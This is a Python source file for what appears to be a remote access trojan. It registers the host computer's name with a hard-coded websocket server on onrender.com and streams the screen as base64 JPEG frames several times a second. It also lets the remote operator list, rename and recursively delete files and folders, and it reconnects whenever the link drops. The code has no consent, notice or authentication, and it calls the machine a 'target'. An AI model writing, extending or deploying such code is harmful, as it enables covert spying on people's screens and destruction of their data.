import base64
import json
import os
import time
import shutil
from io import BytesIO
from mss import mss
from PIL import Image
import websocket 
import threading

RENDER_WS_URL = "wss://anotherwebsite-x1gv.onrender.com"

def get_directory_contents(base_path):
    try:
        items = os.listdir(base_path)
        formatted_list = []
        for item in items:
            if os.path.isdir(os.path.join(base_path, item)):
                # Prepend a folder emoji for directories
                formatted_list.append(f"📁 {item}")
            else:
                # Prepend a document emoji for normal files
                formatted_list.append(f"📄 {item}")
        
        # Sort folders to always show at the top
        formatted_list.sort(key=lambda s: not s.startswith("📁"))
        return formatted_list
    except Exception as e:
        return [f"❌ Error reading path: {e}"]

def command_listener(ws):
    while True:
        try:
            result = ws.recv()
            if not result: break
            payload = json.loads(result)
            
            if payload.get("type") == "execute_command":
                command = payload.get("command")
                
                # Default safety fallback window path environment 
                current_path = payload.get("target_path", "")
                if not current_path or current_path == "":
                    current_path = os.path.abspath("/")
                
                os.makedirs(current_path, exist_ok=True)
                
                if command == "refresh_directory":
                    pass
                
                elif command == "navigate_into":
                    target_subfolder = payload.get("item_name", "")
                    new_computed_path = os.path.abspath(os.path.join(current_path, target_subfolder))
                    if os.path.exists(new_computed_path) and os.path.isdir(new_computed_path):
                        current_path = new_computed_path
                
                elif command == "navigate_back":
                    new_computed_path = os.path.abspath(os.path.join(current_path, ".."))
                    current_path = new_computed_path
                
                elif command == "delete_item":
                    target_item = payload.get("item_name", "")
                    full_target_path = os.path.join(current_path, target_item)
                    try:
                        if os.path.isdir(full_target_path):
                            shutil.rmtree(full_target_path)
                        elif os.path.exists(full_target_path):
                            os.remove(full_target_path)
                    except Exception as e: print(e)
                
                elif command == "rename_item":
                    old_name = payload.get("old_name", "")
                    new_name = payload.get("new_name", "")
                    if old_name and new_name:
                        src = os.path.join(current_path, old_name)
                        dst = os.path.join(current_path, new_name)
                        try:
                            if os.path.exists(src) and not os.path.exists(dst):
                                os.rename(src, dst)
                        except Exception as e: print(e)

                # Instantly transmit new directory state snapshot back up
                ws.send(json.dumps({
                    "type": "file_list",
                    "path": current_path,
                    "files": get_directory_contents(current_path)
                }))
                    
        except Exception as e:
            print(f"Command pipeline read failure: {e}")
            break

def run_target_agent():
    server_url = RENDER_WS_URL
    computer_name = os.environ.get("COMPUTERNAME", "Unknown-PC")
    
    while True:
        try:
            print(f"Connecting to management pipeline at {server_url}...")
            ws = websocket.WebSocket()
            ws.connect(server_url)
            
            ws.send(json.dumps({
                "type": "register_target",
                "COMPUTERNAME": computer_name
            }))
            
            cmd_thread = threading.Thread(target=command_listener, args=(ws,), daemon=True)
            cmd_thread.start()
            
            with mss() as sct:
                monitor = sct.monitors[1]
                while cmd_thread.is_alive():
                    screenshot = sct.grab(monitor)
                    img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")

                    buffer = BytesIO()
                    img.save(buffer, format="JPEG", quality=25) 
                    b64_frame = base64.b64encode(buffer.getvalue()).decode("utf-8")

                    ws.send(json.dumps({
                        "type": "stream_frame",
                        "frame": b64_frame
                    }))
                    
                    time.sleep(0.05) 
                    
        except Exception as e:
            print(f"Target connection lost: {e}. Recovering in 5s...")
            time.sleep(5)

if __name__ == "__main__":
    run_target_agent()